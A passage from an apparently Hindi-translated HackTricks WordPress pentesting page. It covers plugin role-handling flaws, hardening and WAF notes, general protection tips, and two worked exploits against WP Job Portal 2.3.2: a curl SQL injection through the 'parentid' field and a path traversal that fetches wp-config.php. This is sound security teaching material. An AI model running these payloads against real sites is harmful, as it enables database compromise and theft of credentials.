- `$_REQUEST` / `$_GET` / `$_POST` से usernames पढ़ते हैं।
- `add_role()` / `remove_role()` के माध्यम से roles modify करते हैं बिना `current_user_can()` और `wp_verify_nonce()` / `check_admin_referer()` के।
- plugin option array (e.g., `viewing_admin_as_role_are`) के आधार पर authorize करते हैं बजाय उस actor की क्षमताओं के।

Hardening

- हर state-changing branch पर capability checks लागू करें (e.g., `current_user_can('manage_options')` या उससे भी कठोर)।
- सभी role/permission mutations के लिए nonces आवश्यक करें और उन्हें verify करें: `check_admin_referer()` / `wp_verify_nonce()`।
- request-से प्राप्त उपयोगकर्ता नामों पर कभी भरोसा न करें; authenticated actor और explicit policy के आधार पर target user को server-side resolve करें।
- profile/role updates पर “मूल भूमिकाएँ” state को invalidate करें ताकि stale high-privilege restoration से बचा जा सके:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- कम से कम state संग्रहित करने और अस्थायी role switches के लिए समय-सीमित, capability-guarded tokens का उपयोग करने पर विचार करें।

---

### WAF विचार WordPress/plugin CVEs के लिए

Generic edge/server WAFs व्यापक पैटर्न (SQLi, XSS, LFI) के लिए tuned होते हैं। कई high‑impact WordPress/plugin flaws application-specific logic/auth बग होते हैं जो सामान्य ट्रैफ़िक जैसा दिखते हैं जब तक engine WordPress routes और plugin semantics को नहीं समझता।

Offensive notes

- साफ payloads के साथ plugin-specific endpoints को लक्षित करें: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- पहले unauth paths का परीक्षण करें (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes)। Default payloads अक्सर बिना obfuscation के सफल हो जाते हैं।
- सामान्य high-impact मामलों में शामिल हैं: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- plugin CVEs की रक्षा के लिए generic WAF signatures पर भरोसा न करें। application-layer, vulnerability-specific virtual patches लागू करें या जल्दी अपडेट करें।
- negative regex filters की अपेक्षा कोड में positive-security checks को प्राथमिकता दें (capabilities, nonces, strict input validation)।

## WordPress Protection

### नियमित अपडेट

सुनिश्चित करें कि WordPress, plugins, और themes अपडेटेड हैं। साथ ही पुष्टि करें कि automated updating wp-config.php में enabled है:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
साथ ही, **केवल विश्वसनीय WordPress प्लगइन्स और थीम्स ही इंस्टॉल करें।**

### सुरक्षा प्लगइन्स

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **अन्य अनुशंसाएँ**

- डिफ़ॉल्ट **admin** उपयोगकर्ता हटाएँ
- **मजबूत पासवर्ड** और **2FA** का उपयोग करें
- समय-समय पर उपयोगकर्ताओं की **अनुमतियों** की **समीक्षा** करें
- **लॉगिन प्रयासों को सीमित करें** ताकि Brute Force हमलों से बचाव हो सके
- **`wp-admin.php`** फाइल का नाम बदलें और केवल आंतरिक रूप से या कुछ विशिष्ट IP addresses से ही पहुँच की अनुमति दें।

### Unauthenticated SQL Injection (अपर्याप्त सत्यापन के कारण) (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin ने एक **savecategory** task एक्सपोज़ किया था जो अंततः `modules/category/model.php::validateFormData()` के अंदर निम्नलिखित कमजोर कोड को चलाता है:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** – `parentid` सीधे HTTP request से आता है.
2. **String concatenation inside the WHERE clause** – कोई `is_numeric()` / `esc_sql()` / prepared statement नहीं।
3. **Unauthenticated reachability** – हालाँकि action `admin-post.php` के माध्यम से execute होता है, उपलब्ध एकमात्र जांच **CSRF nonce** (`wp_verify_nonce()` ) है, जिसे कोई भी विज़िटर उस public पेज से प्राप्त कर सकता है जो शॉर्टकोड `[wpjobportal_my_resumes]` embed करता है।

#### Exploitation

1. Grab a fresh nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inject arbitrary SQL by abusing `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
The response discloses the result of the injected query or alters the database, proving SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

एक अन्य task, **downloadcustomfile**, विज़िटर्स को path traversal के ज़रिये डिस्क पर रखी **किसी भी फ़ाइल** को download करने की अनुमति देता था। कमजोर sink `modules/customfield/model.php::downloadCustomUploadedFile()` में स्थित है:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` attacker-controlled है और concatenated **without sanitisation**। फिर, एकमात्र gate एक **CSRF nonce** है जिसे resume पृष्ठ से प्राप्त किया जा सकता है।

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
सर्वर `wp-config.php` की सामग्री के साथ प्रतिक्रिया देता है, leaking DB credentials और auth keys।

## संदर्भ

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
